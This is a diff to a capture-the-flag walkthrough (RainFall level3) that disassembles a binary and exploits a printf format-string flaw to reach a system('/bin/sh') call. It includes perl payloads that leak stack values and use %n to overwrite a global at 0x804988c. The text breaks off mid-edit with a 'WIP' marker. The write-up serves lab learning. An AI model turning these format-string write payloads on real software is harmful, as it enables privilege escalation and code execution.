@@ -35,18 +35,34 @@ Dump of assembler code for function v:
    0x080484fc <+88>:    mov    DWORD PTR [esp+0x4],0x1     ; push 1 to stack
    0x08048504 <+96>:    mov    DWORD PTR [esp],eax         ; push eax to stack (arg[0])
    0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>      ; call fwrite
-   0x0804850c <+104>:   mov    DWORD PTR [esp],0x804860d   ; ebx = 0x804860d (contains "/bin/sh")
+   0x0804850c <+104>:   mov    DWORD PTR [esp],0x804860d   ; push 0x804860d content to stack
    0x08048513 <+111>:   call   0x80483c0 <system@plt>      ; call system
    0x08048518 <+116>:   leave
    0x08048519 <+117>:   ret
 End of assembler dump.
 ```
 
-We notice numerous calls: `fgets`, `printf`. `fwrite` and `system`.
+We notice numerous calls: `fgets`, `printf`. `fwrite` and `system`. Also, a conditionnal jumps seems to lead to the end of the function without executing `fwrite` and `system`.
+
+We look at the content of the address 0x804860d (`x/s 0x804860d` command in gdb) pushed on the stack before the call to `system`, which is the string `"/bin/sh"`.
+
+So we know that we don't have to jump after the `cmp eax,0x40` instruction to reach this `system` call.
+
+Since `fgets` protects from a buffer overflow attack, we look for `printf` vulnerabilities, and find [this document](http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf) (also attached in 'Ressources' directory) about the format string one.
+
+This will allow us to write the value 0x40 (64 in decimal) in the address `0x804988c` which is copied to `eax` before the `cmp eax,0x40` instruction. Here is how to proceed.
 
 ## Exploit
 
-We'll exploit the format string vulnerability of `printf`, helped by [this tutorial](http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf) (also attached in 'Ressources' directory) .
+First of all, we inject as many `%x` conversion as needed to make printf move forward through the stack and reach the address were the string we provide to it is stored
+
+```console
+level3@RainFall:~$ perl -e 'print "AAAA %08x %08x %08x %08x\n"' > /tmp/level3
+level3@RainFall:~$ cat /tmp/level3 | ./level3
+AAAA 00000200 b7fd1ac0 b7ff37d0 41414141
+```
+
+Here we have read the stack, and we know that the 4th converted argument that `printf` ## WIP ##
 
 ```console
 level3@RainFall:~$ perl -e 'print "\x8c\x98\x04\x0812345678901234567890123456789012345678901%x%x%x%n"' > /tmp/level3
